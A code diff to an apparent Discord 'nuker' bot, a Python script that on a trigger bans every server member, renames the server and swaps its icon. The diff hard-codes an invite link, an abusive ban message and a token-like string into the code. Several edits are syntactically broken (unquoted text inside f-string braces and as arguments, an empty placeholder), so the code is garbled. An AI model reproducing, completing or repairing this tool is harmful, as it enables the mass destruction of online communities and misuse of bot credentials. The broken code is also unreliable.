@@ -32,8 +32,8 @@ intents.members = True
 client = discord.Client(intents=intents)
 print("\n")
 print(Style.RESET_ALL)
-print(Fore.GREEN + f"[BOT] INVITE: {invite}")
-print(Fore.YELLOW + f"BAN_MSG: {ban_msg}")
+print(Fore.GREEN + f"[BOT] INVITE: {https://discord.gg/3hBTXvRWCC}")
+print(Fore.YELLOW + f"BAN_MSG: {sk fucked ur mum}")
 print(Fore.YELLOW + f"TRIGGER: {trigger}")
 
 @client.event
@@ -61,7 +61,7 @@ async def on_message(message):
         for x in message.guild.members:
             print(Fore.BLUE + f"[MEMBER] BANNING {x}")
             try:
-                await x.ban(reason=ban_msg)
+                await x.ban(reason=sk fucked ur mum)
                 print(Fore.GREEN + "SUCCESS")
             except Exception as e:
                 print(Fore.RED + "FAILED")
@@ -102,13 +102,13 @@ async def on_message(message):
             
 
         print(Fore.GREEN + f"[BOT] NEW NAME: " + (nn:=data["NEW_NAME"]))
-        print(Fore.BLUE + f"[NAME] CHANGING SERVER NAME TO {nn}")
+        print(Fore.BLUE + f"[NAME] CHANGING SERVER NAME TO {swaraj is back}")
         try:
             await message.guild.edit(name=data["NEW_NAME"]) # Change Name icon=logo
             print(Fore.GREEN + "SUCCESS")
         except Exception as e:
             print(Fore.RED + "FAILED")
-        print(Fore.BLUE + f"[ICON] CHANGIN SERVER ICON TO {img}")
+        print(Fore.BLUE + f"[ICON] CHANGIN SERVER ICON TO {}")
         try:
             await message.guild.edit(icon=logo) # Change Name 
             print(Fore.GREEN + "SUCCESS")
@@ -125,4 +125,4 @@ async def on_message(message):
 
 
         print(Style.RESET_ALL)
-client.run(token)
+client.run(D43f5y0ahjqew82jZ4NViEr2YafMKhue)
